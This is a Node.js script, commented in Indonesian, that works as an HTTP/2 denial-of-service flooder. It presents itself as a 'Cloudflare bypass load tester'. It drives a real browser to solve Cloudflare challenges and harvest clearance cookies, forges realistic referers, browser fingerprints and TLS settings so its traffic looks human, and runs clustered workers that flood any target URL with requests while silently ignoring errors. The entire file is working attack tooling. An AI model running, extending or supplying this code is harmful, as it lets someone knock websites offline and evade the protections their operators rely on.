const { connect } = require("puppeteer-real-browser");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const EventEmitter = require('events');

EventEmitter.defaultMaxListeners = 0;

// Configurable constants
const MAX_CONCURRENT_STREAMS_PER_WORKER = 20;

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

const sigalgs = [
    "ecdsa_secp256r1_sha256",
    "rsa_pss_rsae_sha256",
    "rsa_pkcs1_sha256",
    "ecdsa_secp384r1_sha384",
    "rsa_pss_rsae_sha384",
    "rsa_pkcs1_sha384",
    "rsa_pss_rsae_sha512",
    "rsa_pkcs1_sha512"
];

// ============ TAHAP 1: REALISTIS DASAR ============

// 1. Referer dengan variasi search query
function generateRealisticReferer(target) {
    const searchEngines = [
        { url: "https://www.google.com/", param: "q" },
        { url: "https://www.bing.com/", param: "q" },
        { url: "https://duckduckgo.com/", param: "q" },
        { url: "https://search.yahoo.com/", param: "p" }
    ];
    
    const socialMedia = [
        "https://www.facebook.com/",
        "https://twitter.com/",
        "https://www.reddit.com/",
        "https://www.linkedin.com/",
        "https://www.instagram.com/"
    ];
    
    const domain = target.replace(/^https?:\/\//, '').split('/')[0];
    
    // Variasi query yang lebih realistis
    const searchQueries = [
        domain,
        domain + " login",
        domain + " official",
        "www." + domain,
        domain + " com",
        "https://" + domain,
        domain + " website",
        "cara akses " + domain,
        "apakah " + domain + " aman",
        domain + " review",
        "alternatif " + domain
    ];
    
    // 70% search engine, 30% social media
    if (Math.random() < 0.7) {
        const engine = searchEngines[Math.floor(Math.random() * searchEngines.length)];
        const query = searchQueries[Math.floor(Math.random() * searchQueries.length)];
        
        // Kadang dengan parameter tambahan (seperti hasil halaman 2)
        if (Math.random() < 0.1) {
            return `${engine.url}search?${engine.param}=${encodeURIComponent(query)}&start=10`;
        }
        return `${engine.url}search?${engine.param}=${encodeURIComponent(query)}`;
    } else {
        return socialMedia[Math.floor(Math.random() * socialMedia.length)];
    }
}

// 2. Accept headers dengan variasi browser
function generateAcceptHeaders() {
    const browserProfiles = [
        { // Chrome
            accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            encoding: "gzip, deflate, br",
            type: "chrome"
        },
        { // Firefox
            accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            encoding: "gzip, deflate, br",
            type: "firefox"
        },
        { // Safari
            accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            encoding: "gzip, deflate, br",
            type: "safari"
        },
        { // Edge
            accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            encoding: "gzip, deflate, br",
            type: "edge"
        }
    ];
    
    const profile = browserProfiles[Math.floor(Math.random() * browserProfiles.length)];
    
    return {
        accept: profile.accept,
        encoding: profile.encoding,
        browserType: profile.type
    };
}

// 3. Language headers dengan variasi internasional
function generateLanguageHeaders() {
    const languageProfiles = [
        { lang: "en-US,en;q=0.9", country: "US" },
        { lang: "en-GB,en;q=0.8", country: "UK" },
        { lang: "id-ID,id;q=0.9,en;q=0.8", country: "ID" },
        { lang: "en-US,en;q=0.9,id;q=0.8", country: "Mixed" },
        { lang: "ms-MY,ms;q=0.9,en;q=0.8", country: "MY" },
        { lang: "en-SG,en;q=0.9,zh;q=0.8", country: "SG" },
        { lang: "en-AU,en;q=0.9", country: "AU" },
        { lang: "en-CA,en;q=0.9,fr;q=0.8", country: "CA" }
    ];
    
    return languageProfiles[Math.floor(Math.random() * languageProfiles.length)].lang;
}

// 4. Platform headers (Desktop vs Mobile)
function generatePlatformHeaders() {
    // 80% desktop, 20% mobile
    const isDesktop = Math.random() < 0.8;
    
    if (isDesktop) {
        const desktopOS = [
            { platform: "Windows", version: "10.0", mobile: "?0" },
            { platform: "Windows", version: "11.0", mobile: "?0" },
            { platform: "macOS", version: "10.15.7", mobile: "?0" },
            { platform: "macOS", version: "12.0.0", mobile: "?0" },
            { platform: "Linux", version: "x86_64", mobile: "?0" }
        ];
        return desktopOS[Math.floor(Math.random() * desktopOS.length)];
    } else {
        const mobileOS = [
            { platform: "Android", version: "13", mobile: "?1", model: "Pixel 6" },
            { platform: "Android", version: "12", mobile: "?1", model: "Samsung S22" },
            { platform: "iOS", version: "16.0", mobile: "?1", model: "iPhone 14" },
            { platform: "iOS", version: "15.0", mobile: "?1", model: "iPhone 13" }
        ];
        return mobileOS[Math.floor(Math.random() * mobileOS.length)];
    }
}

// 5. Cache control yang bervariasi
function generateCacheHeaders() {
    const cacheProfiles = [
        { "cache-control": "max-age=0" }, // Fresh request
        { "cache-control": "no-cache" },  // Revalidate
        { "cache-control": "no-store" },  // No cache
        { "cache-control": "max-age=0, must-revalidate" },
        {} // No cache header (browser default)
    ];
    
    return cacheProfiles[Math.floor(Math.random() * cacheProfiles.length)];
}

// ============ END TAHAP 1 ============

if (process.argv.length < 6) {
    console.log("\x1b[31mUsage: node uam.js <target> <time> <rate> <threads> <cookieCount>\x1b[0m");
    console.log("\x1b[33mExample: node uam.js https://example.com 60 10 4 5\x1b[0m");
    process.exit(1);
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    cookieCount: parseInt(process.argv[6]) || 2
};

function flood(userAgent, cookie) {
    try {
        let parsed = url.parse(args.target);
        let path = parsed.path || '/';

        // Generate semua headers realistis
        const referer = generateRealisticReferer(args.target);
        const acceptInfo = generateAcceptHeaders();
        const language = generateLanguageHeaders();
        const platform = generatePlatformHeaders();
        const cacheHeaders = generateCacheHeaders();

        // Base headers
        let headers = {
            ":method": "GET",
            ":authority": parsed.host,
            ":scheme": "https",
            ":path": path,
            "user-agent": userAgent,
            "referer": referer,
            "accept": acceptInfo.accept,
            "accept-encoding": acceptInfo.encoding,
            "accept-language": language,
            "upgrade-insecure-requests": "1",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": Math.random() < 0.3 ? "cross-site" : "none",
            "sec-fetch-user": "?1",
            "cookie": cookie,
            ...cacheHeaders
        };

        // Tambahkan Chrome-specific headers jika user-agent dari Chrome
        if (userAgent.includes("Chrome") || acceptInfo.browserType === "chrome" || acceptInfo.browserType === "edge") {
            const chromeVersion = userAgent.match(/Chrome\/(\d+)/)?.[1] || "126";
            headers["sec-ch-ua"] = `"Chromium";v="${chromeVersion}", "Not)A;Brand";v="8"`;
            headers["sec-ch-ua-mobile"] = platform.mobile;
            headers["sec-ch-ua-platform"] = `"${platform.platform}"`;
        }

        // Hapus headers yang undefined
        Object.keys(headers).forEach(key => {
            if (headers[key] === undefined) delete headers[key];
        });

        const tlsSocket = tls.connect({
            host: parsed.host,
            port: 443,
            servername: parsed.host,
            minVersion: "TLSv1.2",
            maxVersion: "TLSv1.3",
            ALPNProtocols: ["h2"],
            ciphers: ciphers,
            sigalgs: sigalgs.join(':'),
            ecdhCurve: "X25519:P-256:P-384",
            rejectUnauthorized: false
        });

        tlsSocket.on('error', () => {});

        const client = http2.connect(parsed.href, {
            createConnection: () => tlsSocket,
            settings: {
                headerTableSize: 65536,
                enablePush: false,
                initialWindowSize: 6291456,
                maxConcurrentStreams: 1000
            }
        });

        client.on("connect", () => {
            const interval = setInterval(() => {
                if (client.destroyed) {
                    clearInterval(interval);
                    return;
                }

                for (let i = 0; i < args.Rate; i++) {
                    const req = client.request(headers);
                    
                    req.on("response", (res) => {
                        global.successRequests = (global.successRequests || 0) + 1;
                        global.totalRequests = (global.totalRequests || 0) + 1;
                    });

                    req.on("error", () => {
                        global.failedRequests = (global.failedRequests || 0) + 1;
                    });

                    req.end();
                }
            }, 1000);
        });

        client.on("close", () => {
            setTimeout(() => flood(userAgent, cookie), 1000);
        });

        client.on("error", () => {});

    } catch (err) {
        // Silently handle errors
    }
}

// CLOUDFLARE BYPASS (STABIL)
async function bypassCloudflare() {
    let browser = null;
    let page = null;
    
    try {
        console.log("\x1b[33mAttempting Cloudflare bypass...\x1b[0m");
        
        const { browser: br, page: pg } = await connect({
            headless: false,
            turnstile: true,
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-blink-features=AutomationControlled'
            ]
        });
        
        browser = br;
        page = pg;
        
        // Set random viewport untuk variasi fingerprint
        const viewports = [
            { width: 1920, height: 1080 },
            { width: 1366, height: 768 },
            { width: 1536, height: 864 },
            { width: 1440, height: 900 },
            { width: 1280, height: 720 }
        ];
        await page.setViewport(viewports[Math.floor(Math.random() * viewports.length)]);
        
        console.log(`\x1b[33mNavigating to ${args.target}...\x1b[0m`);
        await page.goto(args.target, { 
            waitUntil: 'networkidle2', 
            timeout: 30000 
        });
        
        // Tunggu cookie
        let cfClearance = null;
        let attempts = 0;
        
        while (!cfClearance && attempts < 120) {
            await new Promise(r => setTimeout(r, 500));
            const cookies = await page.cookies();
            cfClearance = cookies.find(c => c.name === "cf_clearance");
            attempts++;
        }
        
        const cookies = await page.cookies();
        const userAgent = await page.evaluate(() => navigator.userAgent);
        
        await browser.close();
        
        if (cfClearance) {
            console.log("\x1b[32m✓ CF clearance obtained!\x1b[0m");
            return { cookies, userAgent, success: true };
        } else {
            console.log("\x1b[31m✗ No CF clearance\x1b[0m");
            return { cookies: [], userAgent, success: false };
        }
        
    } catch (error) {
        console.log("\x1b[31mBypass error:\x1b[0m", error.message);
        if (browser) await browser.close();
        return { success: false };
    }
}

async function getMultipleCookies(count) {
    console.log("\x1b[35mOBTAINING COOKIES - TAHAP 1 REALISTIS\x1b[0m");
    const results = [];
    
    for(let i = 0; i < count; i++) {
        console.log(`\n\x1b[36mSession ${i+1}/${count}\x1b[0m`);
        const result = await bypassCloudflare();
        
        if (result.success) {
            results.push(result);
            console.log(`\x1b[32m✓ Got cookie for session ${i+1}\x1b[0m`);
        } else {
            console.log(`\x1b[33m! Using fallback for session ${i+1}\x1b[0m`);
            results.push({
                cookies: [],
                userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
                success: true
            });
        }
        
        if (i < count - 1) {
            console.log("Waiting 2 seconds...");
            await new Promise(r => setTimeout(r, 2000));
        }
    }
    
    return results;
}

function runFlooder() {
    const info = global.bypassData[Math.floor(Math.random() * global.bypassData.length)];
    if (!info) return;

    const cookieString = info.cookies.map(c => `${c.name}=${c.value}`).join("; ");
    flood(info.userAgent, cookieString);
}

function displayStats() {
    const elapsed = Math.floor((Date.now() - global.startTime) / 1000);
    
    console.clear();
    console.log("\x1b[35m=== CLOUDFLARE BYPASS LOAD TESTER [TAHAP 1] ===\x1b[0m");
    console.log(`\x1b[36mTarget:\x1b[0m ${args.target}`);
    console.log(`\x1b[36mTime:\x1b[0m ${elapsed}s / ${args.time}s`);
    console.log(`\x1b[36mRate:\x1b[0m ${args.Rate} req/s per thread`);
    console.log(`\x1b[36mTotal Req:\x1b[0m ${global.totalRequests || 0}`);
    console.log(`\x1b[32mSuccess:\x1b[0m ${global.successRequests || 0}`);
    console.log(`\x1b[31mFailed:\x1b[0m ${global.failedRequests || 0}`);
    console.log(`\x1b[36mActive Workers:\x1b[0m ${Object.keys(cluster.workers || {}).length}`);
    console.log("\x1b[90mFeatures: Variasi Referer | Browser Profiles | International Languages | Desktop/Mobile | Cache Variasi\x1b[0m");
}

// Init
global.totalRequests = 0;
global.successRequests = 0;
global.failedRequests = 0;
global.startTime = Date.now();
global.bypassData = [];

if (cluster.isMaster) {
    console.clear();
    console.log("\x1b[35mCLOUDFLARE BYPASS LOAD TESTER - TAHAP 1\x1b[0m");
    console.log("\x1b[33mFokus: Realistis Dasar dengan Stabilitas\x1b[0m");
    
    (async () => {
        const cookies = await getMultipleCookies(args.cookieCount);
        global.bypassData = cookies;
        
        const successCount = cookies.filter(c => c.cookies.length > 0).length;
        console.log(`\n\x1b[32m✓ Got ${successCount}/${args.cookieCount} valid cookies\x1b[0m`);
        
        console.log(`\n\x1b[33mStarting ${args.threads} workers...\x1b[0m`);
        for (let i = 0; i < args.threads; i++) {
            const worker = cluster.fork();
            worker.send({ type: 'bypassData', data: cookies });
        }
        
        global.startTime = Date.now();
        
        setInterval(displayStats, 1000);
        
        cluster.on('message', (worker, msg) => {
            if (msg.type === 'stats') {
                global.totalRequests += msg.total || 0;
                global.successRequests += msg.success || 0;
                global.failedRequests += msg.failed || 0;
            }
        });
        
        setTimeout(() => {
            console.log("\n\x1b[32m✓ Test completed - Tahap 1 Selesai\x1b[0m");
            process.exit(0);
        }, args.time * 1000);
        
    })();
    
} else {
    process.on('message', (msg) => {
        if (msg.type === 'bypassData') {
            global.bypassData = msg.data;
            
            for (let i = 0; i < 20; i++) {
                setTimeout(runFlooder, i * 100);
            }
            
            setInterval(() => {
                process.send({
                    type: 'stats',
                    total: global.totalRequests || 0,
                    success: global.successRequests || 0,
                    failed: global.failedRequests || 0
                });
                
                global.totalRequests = 0;
                global.successRequests = 0;
                global.failedRequests = 0;
            }, 1000);
        }
    });
}

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
